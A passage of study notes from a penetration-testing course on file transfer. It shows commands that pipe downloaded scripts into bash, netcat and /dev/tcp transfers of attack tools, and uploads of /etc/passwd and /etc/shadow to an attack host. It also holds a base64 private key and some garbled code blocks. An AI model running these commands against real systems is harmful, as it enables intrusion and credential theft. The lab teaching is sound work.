LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFBQUFBQkc1dmJtVUFBQUFFYm05dVpRQUFBQUFBQUFBQkFBQUFsd0FBQUFkemMyZ3RjbgpOaEFBQUFBd0VBQVFBQUFJRUF6WjE0dzV1NU9laHR5SUJQSkg3Tm9Yai84YXNHRUcxcHpJbmtiN2hIMldRVGpMQWRYZE9kCno3YjJtd0tiSW56VmtTM1BUR3ZseGhDVkRRUmpBYzloQ3k1Q0duWnlLM3U2TjQ3RFhURFY0YUtkcXl0UTFUQXZZUHQwWm8KVWh2bEo5YUgxclgzVHUxM2FRWUNQTVdMc2JOV2tLWFJzSk11dTJONkJoRHVmQThhc0FBQUlRRGJXa3p3MjFwTThBQUFBSApjM05vTFhKellRQUFBSUVBeloxNHc1dTVPZWh0eUlCUEpIN05vWGovOGFzR0VHMXB6SW5rYjdoSDJXUVRqTEFkWGRPZHo3CmIybXdLYkluelZrUzNQVEd2bHhoQ1ZEUVJqQWM5aEN5NUNHblp5SzN1Nk40N0RYVERWNGFLZHF5dFExVEF2WVB0MFpvVWgKdmxKOWFIMXJYM1R1MTNhUVlDUE1XTHNiTldrS1hSc0pNdXUyTjZCaER1ZkE4YXNBQUFBREFRQUJBQUFBZ0NjQ28zRHBVSwpFdCtmWTZjY21JelZhL2NEL1hwTlRsRFZlaktkWVFib0ZPUFc5SjBxaUVoOEpyQWlxeXVlQTNNd1hTWFN3d3BHMkpvOTNPCllVSnNxQXB4NlBxbFF6K3hKNjZEdzl5RWF1RTA5OXpodEtpK0pvMkttVzJzVENkbm92Y3BiK3Q3S2lPcHlwYndFZ0dJWVkKZW9VT2hENVJyY2s5Q3J2TlFBem9BeEFBQUFRUUNGKzBtTXJraklXL09lc3lJRC9JQzJNRGNuNTI0S2NORUZ0NUk5b0ZJMApDcmdYNmNoSlNiVWJsVXFqVEx4NmIyblNmSlVWS3pUMXRCVk1tWEZ4Vit0K0FBQUFRUURzbGZwMnJzVTdtaVMyQnhXWjBNCjY2OEhxblp1SWc3WjVLUnFrK1hqWkdqbHVJMkxjalRKZEd4Z0VBanhuZEJqa0F0MExlOFphbUt5blV2aGU3ekkzL0FBQUEKUVFEZWZPSVFNZnQ0R1NtaERreWJtbG1IQXRkMUdYVitOQTRGNXQ0UExZYzZOYWRIc0JTWDJWN0liaFA1cS9yVm5tVHJRZApaUkVJTW84NzRMUkJrY0FqUlZBQUFBRkhCc1lXbHVkR1Y0ZEVCamVXSmxjbk53WVdObEFRSURCQVVHCi0tLS0tRU5EIE9QRU5TU0ggUFJJVkFURSBLRVktLS0tLQo=
```

We copy this content, paste it onto our Linux target machine, and useÂ `base64`Â with the option `-d' to decode it.

#### Linux - Decode the File

```shell

```

Finally, we can confirm if the file was transferred successfully using theÂ `md5sum`Â command.

#### Linux - Confirm the MD5 Hashes Match

```shell
gitblanc@htb[/htb]$ md5sum id_rsa

4e301756a07ded0a2dd6953abf015278  id_rsa
```

>[!Note]
>You can also upload files using the reverse operation. From your compromised target cat and base64 encode a file and decode it in your Pwnbox.

## Web Downloads with Wget and cURL

Two of the most common utilities in Linux distributions to interact with web applications areÂ `wget`Â andÂ `curl`. These tools are installed on many Linux distributions.

To download a file usingÂ `wget`, we need to specify the URL and the option `-O' to set the output filename.

#### Download a File Using wget

```shell
gitblanc@htb[/htb]$ wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O /tmp/LinEnum.sh
```

`cURL`Â is very similar toÂ `wget`, but the output filename option is lowercase `-o'.

#### Download a File Using cURL

```shell
gitblanc@htb[/htb]$ curl -o /tmp/LinEnum.sh https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
```

## Fileless Attacks Using Linux

Because of the way Linux works and howÂ [pipes operate](https://www.geeksforgeeks.org/piping-in-unix-or-linux/), most of the tools we use in Linux can be used to replicate fileless operations, which means that we don't have to download a file to execute it.

**Note:**Â Some payloads such asÂ `mkfifo`Â write files to disk. Keep in mind that while the execution of the payload may be fileless when you use a pipe, depending on the payload chosen it may create temporary files on the OS.

Let's take theÂ `cURL`Â command we used, and instead of downloading LinEnum.sh, let's execute it directly using a pipe.

#### Fileless Download with cURL

```shell
gitblanc@htb[/htb]$ curl https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh | bash
```

Similarly, we can download a Python script file from a web server and pipe it into the Python binary. Let's do that, this time usingÂ `wget`.

#### Fileless Download with wget

```shell
gitblanc@htb[/htb]$ wget -qO- https://raw.githubusercontent.com/juliourena/plaintext/master/Scripts/helloworld.py | python3

Hello World!
```

## Download with Bash (/dev/tcp)

There may also be situations where none of the well-known file transfer tools are available. As long as Bash version 2.04 or greater is installed (compiled with --enable-net-redirections), the built-in /dev/TCP device file can be used for simple file downloads.

#### Connect to the Target Webserver

```shell
gitblanc@htb[/htb]$ exec 3<>/dev/tcp/10.10.10.32/80
```

#### HTTP GET Request

```shell
gitblanc@htb[/htb]$ echo -e "GET /LinEnum.sh HTTP/1.1\n\n">&3
```

#### Print the Response

```shell
gitblanc@htb[/htb]$ cat <&3
```

## SSH Downloads

SSH (or Secure Shell) is a protocol that allows secure access to remote computers. SSH implementation comes with anÂ `SCP`Â utility for remote file transfer that, by default, uses the SSH protocol.

`SCP`Â (secure copy) is a command-line utility that allows you to copy files and directories between two hosts securely. We can copy our files from local to remote servers and from remote servers to our local machine.

`SCP`Â is very similar toÂ `copy`Â orÂ `cp`, but instead of providing a local path, we need to specify a username, the remote IP address or DNS name, and the user's credentials.

Before we begin downloading files from our target Linux machine to our Pwnbox, let's set up an SSH server in our Pwnbox.

#### Enabling the SSH Server

```shell
gitblanc@htb[/htb]$ sudo systemctl enable ssh

Synchronizing state of ssh.service with SysV service script with /lib/systemd/systemd-sysv-install.
Executing: /lib/systemd/systemd-sysv-install enable ssh
Use of uninitialized value $service in hash element at /usr/sbin/update-rc.d line 26, <DATA> line 45
...SNIP...
```

#### Starting the SSH Server

```shell
gitblanc@htb[/htb]$ sudo systemctl start ssh
```

#### Checking for SSH Listening Port

```shell
gitblanc@htb[/htb]$ netstat -lnpt

(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      - 
```

Now we can begin transferring files. We need to specify the IP address of our Pwnbox and the username and password.

#### Linux - Downloading Files Using SCP

```shell
gitblanc@htb[/htb]$ scp plaintext@192.168.49.128:/root/myroot.txt . 
```

>[!Note]
>You can create a temporary user account for file transfers and avoid using your primary credentials or keys on a remote computer.

## Upload Operations

There are also situations such as binary exploitation and packet capture analysis, where we must upload files from our target machine onto our attack host. The methods we used for downloads will also work for uploads. Let's see how we can upload files in various ways.

## Web Upload

As mentioned in theÂ `Windows File Transfer Methods`Â section, we can useÂ [uploadserver](https://github.com/Densaugeo/uploadserver), an extended module of the PythonÂ `HTTP.Server`Â module, which includes a file upload page. For this Linux example, let's see how we can configure theÂ `uploadserver`Â module to useÂ `HTTPS`Â for secure communication.

The first thing we need to do is to install theÂ `uploadserver`Â module.

#### Pwnbox - Start Web Server

```shell
gitblanc@htb[/htb]$ sudo python3 -m pip install --user uploadserver

Collecting uploadserver
  Using cached uploadserver-2.0.1-py3-none-any.whl (6.9 kB)
Installing collected packages: uploadserver
Successfully installed uploadserver-2.0.1
```

Now we need to create a certificate. In this example, we are using a self-signed certificate.

#### Pwnbox - Create a Self-Signed Certificate

```shell
gitblanc@htb[/htb]$ openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'

Generating a RSA private key
................................................................................+++++
.......+++++
writing new private key to 'server.pem'
-----
```

The webserver should not host the certificate. We recommend creating a new directory to host the file for our webserver.

#### Pwnbox - Start Web Server

```shell
gitblanc@htb[/htb]$ mkdir https && cd https
```

```shell
gitblanc@htb[/htb]$ sudo python3 -m uploadserver 443 --server-certificate ~/server.pem

File upload available at /upload
Serving HTTPS on 0.0.0.0 port 443 (https://0.0.0.0:443/) ...
```

Now from our compromised machine, let's upload theÂ `/etc/passwd`Â andÂ `/etc/shadow`Â files.

#### Linux - Upload Multiple Files

```shell
gitblanc@htb[/htb]$ curl -X POST https://192.168.49.128/upload -F 'files=@/etc/passwd' -F 'files=@/etc/shadow' --insecure
```

We used the optionÂ `--insecure`Â because we used a self-signed certificate that we trust.

## Alternative Web File Transfer Method

Since Linux distributions usually haveÂ `Python`Â orÂ `php`Â installed, starting a web server to transfer files is straightforward. Also, if the server we compromised is a web server, we can move the files we want to transfer to the web server directory and access them from the web page, which means that we are downloading the file from our Pwnbox.

It is possible to stand up a web server using various languages. A compromised Linux machine may not have a web server installed. In such cases, we can use a mini web server. What they perhaps lack in security, they make up for flexibility, as the webroot location and listening ports can quickly be changed.

#### Linux - Creating a Web Server with Python3

```shell
gitblanc@htb[/htb]$ python3 -m http.server

Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

#### Linux - Creating a Web Server with Python2.7

```shell
gitblanc@htb[/htb]$ python2.7 -m SimpleHTTPServer

Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

#### Linux - Creating a Web Server with PHP

```shell
gitblanc@htb[/htb]$ php -S 0.0.0.0:8000

[Fri May 20 08:16:47 2022] PHP 7.4.28 Development Server (http://0.0.0.0:8000) started
```

#### Linux - Creating a Web Server with Ruby

```shell
gitblanc@htb[/htb]$ ruby -run -ehttpd . -p8000

```

#### Download the File from the Target Machine onto the Pwnbox

```shell
gitblanc@htb[/htb]$ wget 192.168.49.128:8000/filetotransfer.txt

>[!Note]
>When we start a new web server using Python or PHP, it's important to consider that inbound traffic may be blocked. We are transferring a file from our target onto our attack host, but we are not uploading the file.

## SCP Upload

We may find some companies that allow theÂ `SSH protocol`Â (TCP/22) for outbound connections, and if that's the case, we can use an SSH server with theÂ `scp`Â utility to upload files. Let's attempt to upload a file to the target machine using the SSH protocol.

#### File Upload using SCP

```shell
gitblanc@htb[/htb]$ scp /etc/passwd htb-student@10.129.86.90:/home/htb-student/

htb-student@10.129.86.90's password: 
passwd                                                                                                           100% 3414     6.7MB/s   00:00
```

>[!Note]
>Remember that scp syntax is similar to cp or copy.

# Transferring Files with Code

It's common to find different programming languages installed on the machines we are targetting. Programming languages such as Python, PHP, Perl, and Ruby are commonly available in Linux distributions but can also be installed on Windows, although this is far less common.

We can use some Windows default applications, such asÂ `cscript`Â andÂ `mshta`, to execute JavaScript or VBScript code. JavaScript can also run on Linux hosts.

According to Wikipedia, there are aroundÂ [700 programming languages](https://en.wikipedia.org/wiki/List_of_programming_languages), and we can create code in any programing language, to download, upload or execute instructions to the OS. This section will provide a few examples using common programming languages.

## Python

Python is a popular programming language. Currently, version 3 is supported, but we may find servers where Python version 2.7 still exists.Â `Python`Â can run one-liners from an operating system command line using the optionÂ `-c`. Let's see some examples:

#### Python 2 - Download

```shell
gitblanc@htb[/htb]$ python2.7 -c 'import urllib;urllib.urlretrieve ("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")'
```

#### Python 3 - Download

```shell
gitblanc@htb[/htb]$ python3 -c 'import urllib.request;urllib.request.urlretrieve("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")'
```

## PHP

`PHP`Â is also very prevalent and provides multiple file transfer methods.Â [According to W3Techs' data](https://w3techs.com/technologies/details/pl-php), PHP is used by 77.4% of all websites with a known server-side programming language. Although the information is not precise, and the number may be slightly lower, we will often encounter web services that use PHP when performing an offensive operation.

Let's see some examples of downloading files using PHP.

In the following example, we will use the PHPÂ [file_get_contents() module](https://www.php.net/manual/en/function.file-get-contents.php)Â to download content from a website combined with theÂ [file_put_contents() module](https://www.php.net/manual/en/function.file-put-contents.php)Â to save the file into a directory.Â `PHP`Â can be used to run one-liners from an operating system command line using the optionÂ `-r`.

#### PHP Download with File_get_contents()

```shell
gitblanc@htb[/htb]$ php -r '$file = file_get_contents("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); file_put_contents("LinEnum.sh",$file);'
```

An alternative toÂ `file_get_contents()`Â andÂ `file_put_contents()`Â is theÂ [fopen() module](https://www.php.net/manual/en/function.fopen.php). We can use this module to open a URL, read it's content and save it into a file.

#### PHP Download with Fopen()

```shell
gitblanc@htb[/htb]$ php -r 'const BUFFER = 1024; $fremote = 
fopen("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "rb"); $flocal = fopen("LinEnum.sh", "wb"); while ($buffer = fread($fremote, BUFFER)) { fwrite($flocal, $buffer); } fclose($flocal); fclose($fremote);'
```

We can also send the downloaded content to a pipe instead, similar to the fileless example we executed in the previous section using cURL and wget.

#### PHP Download a File and Pipe it to Bash

```shell
gitblanc@htb[/htb]$ php -r '$lines = @file("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); foreach ($lines as $line_num => $line) { echo $line; }' | bash
```

>[!Note]
>The URL can be used as a filename with the @file function if the fopen wrappers have been enabled.

## Other Languages

`Ruby`Â andÂ `Perl`Â are other popular languages that can also be used to transfer files. These two programming languages also support running one-liners from an operating system command line using the optionÂ `-e`.

#### Ruby - Download a File

```shell
gitblanc@htb[/htb]$ ruby -e 'require "net/http"; File.write("LinEnum.sh", Net::HTTP.get(URI.parse("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh")))'
```

#### Perl - Download a File

```shell
gitblanc@htb[/htb]$ perl -e 'use LWP::Simple; getstore("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh");'
```

## JavaScript

JavaScript is a scripting or programming language that allows you to implement complex features on web pages. Like with other programming languages, we can use it for many different things.

The following JavaScript code is based onÂ [this](https://superuser.com/questions/25538/how-to-download-files-from-command-line-in-windows-like-wget-or-curl/373068)Â post, and we can download a file using it. We'll create a file calledÂ `wget.js`Â and save the following content:

```javascript
var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
WinHttpReq.Open("GET", WScript.Arguments(0), /*async=*/false);
WinHttpReq.Send();
BinStream = new ActiveXObject("ADODB.Stream");
BinStream.Type = 1;
BinStream.Open();
BinStream.Write(WinHttpReq.ResponseBody);
BinStream.SaveToFile(WScript.Arguments(1));
```

We can use the following command from a Windows command prompt or PowerShell terminal to execute our JavaScript code and download a file.

#### Download a File Using JavaScript and cscript.exe

```cmd
C:\htb> cscript.exe /nologo wget.js https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 PowerView.ps1
```

## VBScript

[VBScript](https://en.wikipedia.org/wiki/VBScript)Â ("Microsoft Visual Basic Scripting Edition") is an Active Scripting language developed by Microsoft that is modeled on Visual Basic. VBScript has been installed by default in every desktop release of Microsoft Windows since Windows 98.

The following VBScript example can be used based onÂ [this](https://stackoverflow.com/questions/2973136/download-a-file-with-vbs). We'll create a file calledÂ `wget.vbs`Â and save the following content:

```vbscript
dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")
dim bStrm: Set bStrm = createobject("Adodb.Stream")
xHttp.Open "GET", WScript.Arguments.Item(0), False
xHttp.Send

with bStrm
    .type = 1
    .open
    .write xHttp.responseBody
    .savetofile WScript.Arguments.Item(1), 2
end with
```

We can use the following command from a Windows command prompt or PowerShell terminal to execute our VBScript code and download a file.

#### Download a File Using VBScript and cscript.exe

```cmd
C:\htb> cscript.exe /nologo wget.vbs https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 PowerView2.ps1
```

## Upload Operations using Python3

If we want to upload a file, we need to understand the functions in a particular programming language to perform the upload operation. The Python3Â [requests module](https://pypi.org/project/requests/)Â allows you to send HTTP requests (GET, POST, PUT, etc.) using Python. We can use the following code if we want to upload a file to our Python3Â [uploadserver](https://github.com/Densaugeo/uploadserver).

#### Starting the Python uploadserver Module

```shell
gitblanc@htb[/htb]$ python3 -m uploadserver 

File upload available at /upload
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

#### Uploading a File Using a Python One-liner

```shell
gitblanc@htb[/htb]$ python3 -c 'import requests;requests.post("http://192.168.49.128:8000/upload",files={"files":open("/etc/passwd","rb")})'
```

Let's divide this one-liner into multiple lines to understand each piece better.

```python
# To use the requests function, we need to import the module first.
import requests 

# Define the target URL where we will upload the file.
URL = "http://192.168.49.128:8000/upload"

# Define the file we want to read, open it and save it in a variable.
file = open("/etc/passwd","rb")

# Use a requests POST request to upload the file. 
r = requests.post(url,files={"files":file})
```

We can do the same with any other programming language. A good practice is picking one and trying to build an upload program.

# Miscellaneous File Transfer Methods

We've covered various methods for transferring files on Windows and Linux. We also covered ways to achieve the same goal using different programming languages, but there are still many more methods and applications that we can use.

This section will cover alternative methods such as transferring files usingÂ [Netcat](https://en.wikipedia.org/wiki/Netcat),Â [Ncat](https://nmap.org/ncat/)Â and using RDP and PowerShell sessions.

## Netcat

[Netcat](https://sectools.org/tool/netcat/)Â (often abbreviated toÂ `nc`) is a computer networking utility for reading from and writing to network connections using TCP or UDP, which means that we can use it for file transfer operations.

The original Netcat wasÂ [released](http://seclists.org/bugtraq/1995/Oct/0028.html)Â by Hobbit in 1995, but it hasn't been maintained despite its popularity. The flexibility and usefulness of this tool prompted the Nmap Project to produceÂ [Ncat](https://nmap.org/ncat/), a modern reimplementation that supports SSL, IPv6, SOCKS and HTTP proxies, connection brokering, and more.

In this section, we will use both the original Netcat and Ncat.

>[!Note]
>**Ncat**Â is used in HackTheBox's PwnBox as nc, ncat, and netcat.

## File Transfer with Netcat and Ncat

The target or attacking machine can be used to initiate the connection, which is helpful if a firewall prevents access to the target. Let's create an example and transfer a tool to our target.

In this example, we'll transferÂ [SharpKatz.exe](https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_x64/SharpKatz.exe)Â from our Pwnbox onto the compromised machine. We'll do it using two methods. Let's work through the first one.

We'll first start Netcat (`nc`) on the compromised machine, listening with optionÂ `-l`, selecting the port to listen with the optionÂ `-p 8000`, and redirect theÂ [stdout](https://en.wikipedia.org/wiki/Standard_streams#Standard_input_\(stdin\))Â using a single greater-thanÂ `>`Â followed by the filename,Â `SharpKatz.exe`.

#### NetCat - Compromised Machine - Listening on Port 8000

```shell
victim@target:~$ # Example using Original Netcat
victim@target:~$ nc -l -p 8000 > SharpKatz.exe
```

If the compromised machine is using Ncat, we'll need to specifyÂ `--recv-only`Â to close the connection once the file transfer is finished.

#### Ncat - Compromised Machine - Listening on Port 8000

```shell
victim@target:~$ # Example using Ncat
victim@target:~$ ncat -l -p 8000 --recv-only > SharpKatz.exe
```

From our attack host, we'll connect to the compromised machine on port 8000 using Netcat and send the fileÂ [SharpKatz.exe](https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_x64/SharpKatz.exe)Â as input to Netcat. The optionÂ `-q 0`Â will tell Netcat to close the connection once it finishes. That way, we'll know when the file transfer was completed.

#### Netcat - Attack Host - Sending File to Compromised machine

```shell
gitblanc@htb[/htb]$ wget -q https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_x64/SharpKatz.exe
gitblanc@htb[/htb]$ # Example using Original Netcat
gitblanc@htb[/htb]$ nc -q 0 192.168.49.128 8000 < SharpKatz.exe
```

By utilizing Ncat on our attacking host, we can opt forÂ `--send-only`Â rather thanÂ `-q`. TheÂ `--send-only`Â flag, when used in both connect and listen modes, prompts Ncat to terminate once its input is exhausted. Typically, Ncat would continue running until the network connection is closed, as the remote side may transmit additional data. However, withÂ `--send-only`, there is no need to anticipate further incoming information.

#### Ncat - Attack Host - Sending File to Compromised machine

```shell
gitblanc@htb[/htb]$ wget -q https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_x64/SharpKatz.exe
gitblanc@htb[/htb]$ # Example using Ncat
gitblanc@htb[/htb]$ ncat --send-only 192.168.49.128 8000 < SharpKatz.exe
```

Instead of listening on our compromised machine, we can connect to a port on our attack host to perform the file transfer operation. This method is useful in scenarios where there's a firewall blocking inbound connections. Let's listen on port 443 on our Pwnbox and send the fileÂ [SharpKatz.exe](https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_x64/SharpKatz.exe)Â as input to Netcat.

#### Attack Host - Sending File as Input to Netcat

```shell
gitblanc@htb[/htb]$ # Example using Original Netcat
gitblanc@htb[/htb]$ sudo nc -l -p 443 -q 0 < SharpKatz.exe
```

#### Compromised Machine Connect to Netcat to Receive the File

```shell
victim@target:~$ # Example using Original Netcat
victim@target:~$ nc 192.168.49.128 443 > SharpKatz.exe
```

Let's do the same with Ncat:

#### Attack Host - Sending File as Input to Ncat

```shell
gitblanc@htb[/htb]$ # Example using Ncat
gitblanc@htb[/htb]$ sudo ncat -l -p 443 --send-only < SharpKatz.exe
```

#### Compromised Machine Connect to Ncat to Receive the File

```shell
victim@target:~$ # Example using Ncat
victim@target:~$ ncat 192.168.49.128 443 --recv-only > SharpKatz.exe
```

If we don't have Netcat or Ncat on our compromised machine, Bash supports read/write operations on a pseudo-device fileÂ [/dev/TCP/](https://tldp.org/LDP/abs/html/devref1.html).

Writing to this particular file makes Bash open a TCP connection toÂ `host:port`, and this feature may be used for file transfers.

#### NetCat - Sending File as Input to Netcat

```shell
gitblanc@htb[/htb]$ # Example using Original Netcat
gitblanc@htb[/htb]$ sudo nc -l -p 443 -q 0 < SharpKatz.exe
```

#### Ncat - Sending File as Input to Ncat

```shell
gitblanc@htb[/htb]$ # Example using Ncat
gitblanc@htb[/htb]$ sudo ncat -l -p 443 --send-only < SharpKatz.exe
```

#### Compromised Machine Connecting to Netcat Using /dev/tcp to Receive the File

```shell
victim@target:~$ cat < /dev/tcp/192.168.49.128/443 > SharpKatz.exe
```

>[!Note]
>The same operation can be used to transfer files from the compromised host to our Pwnbox.

## PowerShell Session File Transfer

We already talked about doing file transfers with PowerShell, but there may be scenarios where HTTP, HTTPS, or SMB are unavailable. If that's the case, we can useÂ [PowerShell Remoting](https://docs.microsoft.com/en-us/powershell/scripting/learn/remoting/running-remote-commands?view=powershell-7.2), aka WinRM, to perform file transfer operations.

[PowerShell Remoting](https://docs.microsoft.com/en-us/powershell/scripting/learn/remoting/running-remote-commands?view=powershell-7.2)Â allows us to execute scripts or commands on a remote computer using PowerShell sessions. Administrators commonly use PowerShell Remoting to manage remote computers in a network, and we can also use it for file transfer operations. By default, enabling PowerShell remoting creates both an HTTP and an HTTPS listener. The listeners run on default ports TCP/5985 for HTTP and TCP/5986 for HTTPS.

To create a PowerShell Remoting session on a remote computer, we will need administrative access, be a member of theÂ `Remote Management Users`Â group, or have explicit permissions for PowerShell Remoting in the session configuration. Let's create an example and transfer a file fromÂ `DC01`Â toÂ `DATABASE01`Â and vice versa.

We have a session asÂ `Administrator`Â inÂ `DC01`, the user has administrative rights onÂ `DATABASE01`, and PowerShell Remoting is enabled. Let's use Test-NetConnection to confirm we can connect to WinRM.

#### From DC01 - Confirm WinRM port TCP 5985 is Open on DATABASE01.

```powershell
PS C:\htb> whoami

htb\administrator

PS C:\htb> hostname

DC01
```

```powershell
PS C:\htb> Test-NetConnection -ComputerName DATABASE01 -Port 5985

ComputerName     : DATABASE01
RemoteAddress    : 192.168.1.101
RemotePort       : 5985
InterfaceAlias   : Ethernet0
SourceAddress    : 192.168.1.100
TcpTestSucceeded : True
```

Because this session already has privileges overÂ `DATABASE01`, we don't need to specify credentials. In the example below, a session is created to the remote computer namedÂ `DATABASE01`Â and stores the results in the variable namedÂ `$Session`.

#### Create a PowerShell Remoting Session to DATABASE01

```powershell
PS C:\htb> $Session = New-PSSession -ComputerName DATABASE01
```

We can use theÂ `Copy-Item`Â cmdlet to copy a file from our local machineÂ `DC01`Â to theÂ `DATABASE01`Â session we haveÂ `$Session`Â or vice versa.

#### Copy samplefile.txt from our Localhost to the DATABASE01 Session

```powershell
PS C:\htb> Copy-Item -Path C:\samplefile.txt -ToSession $Session -Destination C:\Users\Administrator\Desktop\
```

#### Copy DATABASE.txt from DATABASE01 Session to our Localhost

```powershell
PS C:\htb> Copy-Item -Path "C:\Users\Administrator\Desktop\DATABASE.txt" -Destination C:\ -FromSession $Session
```

## RDP

RDP (Remote Desktop Protocol) is commonly used in Windows networks for remote access. We can transfer files using RDP by copying and pasting. We can right-click and copy a file from the Windows machine we connect to and paste it into the RDP session.

If we are connected from Linux, we can useÂ `xfreerdp`Â orÂ `rdesktop`. At the time of writing,Â `xfreerdp`Â andÂ `rdesktop`Â allow copy from our target machine to the RDP session, but there may be scenarios where this may not work as expected.

As an alternative to copy and paste, we can mount a local resource on the target RDP server.Â `rdesktop`Â orÂ `xfreerdp`Â can be used to expose a local folder in the remote RDP session.

#### Mounting a Linux Folder Using rdesktop

```shell
gitblanc@htb[/htb]$ rdesktop 10.10.10.132 -d HTB -u administrator -p 'Password0@' -r disk:linux='/home/user/rdesktop/files'
```

#### Mounting a Linux Folder Using xfreerdp

```shell
gitblanc@htb[/htb]$ xfreerdp /v:10.10.10.132 /d:HTB /u:administrator /p:'Password0@' /drive:linux,/home/plaintext/htb/academy/filetransfer
```

To access the directory, we can connect toÂ `\\tsclient\`, allowing us to transfer files to and from the RDP session.

![](Pasted%20image%2020250604115346.png)

Alternatively, from Windows, the nativeÂ [mstsc.exe](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/mstsc)Â remote desktop client can be used.

![](Pasted%20image%2020250604115353.png)

After selecting the drive, we can interact with it in the remote session that follows.

>[!Note]
>This drive is not accessible to any other users logged on to the target computer, even if they manage to hijack the RDP session.

## Practice Makes Perfect

It's worth referencing this section or creating your own notes on these techniques and applying them to labs in other modules in the Penetration Tester Job Role Path and beyond. Some modules/sections where these could come in handy include:

- `Active Directory Enumeration and Attacks`Â - Skills Assessments 1 & 2
- Throughout theÂ `Pivoting, Tunnelling & Port Forwarding`Â module
- Throughout theÂ `Attacking Enterprise Networks`Â module
- Throughout theÂ `Shells & Payloads`Â module

You never know what you're up against until you start a lab (or real-world assessment). Once you master one technique in this section or other sections of this module, try another. By the time you finish the Penetration Tester Job Role Path, it would be great to have tried most, if not all, of these techniques. This will help with your "muscle memory" and give you ideas of how to upload/download files when you face a different environment with certain restrictions that make one easier method fail. In the next section, we'll discuss protecting our file transfers when dealing with sensitive data.

# Protected File Transfers

As penetration testers, we often gain access to highly sensitive data such as user lists, credentials (i.e., downloading the NTDS.dit file for offline password cracking), and enumeration data that can contain critical information about the organization's network infrastructure, and Active Directory (AD) environment, etc. Therefore, it is essential to encrypt this data or use encrypted data connections such as SSH, SFTP, and HTTPS. However, sometimes these options are not available to us, and a different approach is required.

>[!Note]
>Unless specifically requested by a client, we do not recommend exfiltrating data such as Personally Identifiable Information (PII), financial data (i.e., credit card numbers), trade secrets, etc., from a client environment. Instead, if attempting to test Data Loss Prevention (DLP) controls/egress filtering protections, create a file with dummy data that mimics the data that the client is trying to protect.

Therefore, encrypting the data or files before a transfer is often necessary to prevent the data from being read if intercepted in transit.

Data leakage during a penetration test could have severe consequences for the penetration tester, their company, and the client. As information security professionals, we must act professionally and responsibly and take all measures to protect any data we encounter during an assessment.

## File Encryption on Windows

Many different methods can be used to encrypt files and information on Windows systems. One of the simplest methods is theÂ [Invoke-AESEncryption.ps1](https://www.powershellgallery.com/packages/DRTools/4.0.2.3/Content/Functions%5CInvoke-AESEncryption.ps1)Â PowerShell script. This script is small and provides encryption of files and strings.

#### Invoke-AESEncryption.ps1

```powershell
.EXAMPLE
Invoke-AESEncryption -Mode Encrypt -Key "p@ssw0rd" -Text "Secret Text" 

Description
-----------
Encrypts the string "Secret Test" and outputs a Base64 encoded ciphertext.
 
.EXAMPLE
Invoke-AESEncryption -Mode Decrypt -Key "p@ssw0rd" -Text "LtxcRelxrDLrDB9rBD6JrfX/czKjZ2CUJkrg++kAMfs="
 
Description
-----------
Decrypts the Base64 encoded string "LtxcRelxrDLrDB9rBD6JrfX/czKjZ2CUJkrg++kAMfs=" and outputs plain text.
 
.EXAMPLE
Invoke-AESEncryption -Mode Encrypt -Key "p@ssw0rd" -Path file.bin

                if ($Text) {$plainBytes = [System.Text.Encoding]::UTF8.GetBytes($Text)}
                
                if ($Path) {
                    $File = Get-Item -Path $Path -ErrorAction SilentlyContinue
                    if (!$File.FullName) {
                        Write-Error -Message "File not found!"
                        break
                    }
                    $plainBytes = [System.IO.File]::ReadAllBytes($File.FullName)
                    $outPath = $File.FullName + ".aes"

                $encryptedBytes = $aesManaged.IV + $encryptedBytes
                $aesManaged.Dispose()

                if ($Text) {return [System.Convert]::ToBase64String($encryptedBytes)}
                
                if ($Path) {
                    [System.IO.File]::WriteAllBytes($outPath, $encryptedBytes)
                    (Get-Item $outPath).LastWriteTime = $File.LastWriteTime
                    return "File encrypted to $outPath"
                }
            }

            'Decrypt' {
                if ($Text) {$cipherBytes = [System.Convert]::FromBase64String($Text)}
                
                if ($Path) {
                    $File = Get-Item -Path $Path -ErrorAction SilentlyContinue
                    if (!$File.FullName) {
                        Write-Error -Message "File not found!"
                        break
                    }
                    $cipherBytes = [System.IO.File]::ReadAllBytes($File.FullName)
                    $outPath = $File.FullName -replace ".aes"
                }

                $aesManaged.IV = $cipherBytes[0..15]
                $decryptor = $aesManaged.CreateDecryptor()
                $decryptedBytes = $decryptor.TransformFinalBlock($cipherBytes, 16, $cipherBytes.Length - 16)
                $aesManaged.Dispose()

                if ($Text) {return [System.Text.Encoding]::UTF8.GetString($decryptedBytes).Trim([char]0)}
                
                if ($Path) {
                    [System.IO.File]::WriteAllBytes($outPath, $decryptedBytes)
